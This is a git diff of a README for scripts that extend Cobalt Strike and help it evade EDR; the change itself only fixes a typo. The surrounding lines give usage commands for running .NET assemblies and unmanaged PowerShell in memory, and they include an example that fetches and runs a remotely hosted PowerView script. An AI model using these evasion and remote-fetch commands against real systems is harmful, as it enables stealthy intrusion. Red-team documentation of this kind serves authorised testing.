@@ -39,7 +39,7 @@ Various resources to enhance Cobalt Strike's functionality and its ability to ev
 3. Load script into Cobalt Strike
 4. Execute .NET assembly inline with `x execute-assembly <exe> <args>`
 5. Execute unmanaged powershell inline with `x powerpick <powershell>`
-   - I made this compatible with `powershell-import`, but I noticed that using this method of importing scripts generally gets detected EDR. If you'd like to remove this functionality altogether, comment/remove lines 257 and 258.
+   - I made this compatible with `powershell-import`, but I noticed that using this method of importing scripts generally gets detected by EDR. If you'd like to remove this functionality altogether, comment/remove lines 257 and 258.
    - As an alternative, use `--import <script>` (eg. `x --import http://example.com/PowerView.ps1 powerpick Get-Domain`). You can specify a local file on disk or remotely hosted file with http/https. This only supports *one* script. I'm too lazy to extend the functionality to support multiple scripts when one is usually all you need.
 
 **Note:** I commented out the portions of the script that parse double quotes (") in arguments differently because I found this to get in the way, especially when running PowerShell commands. If you don't like this, you are welcome to uncomment the code portions starting on line 87.
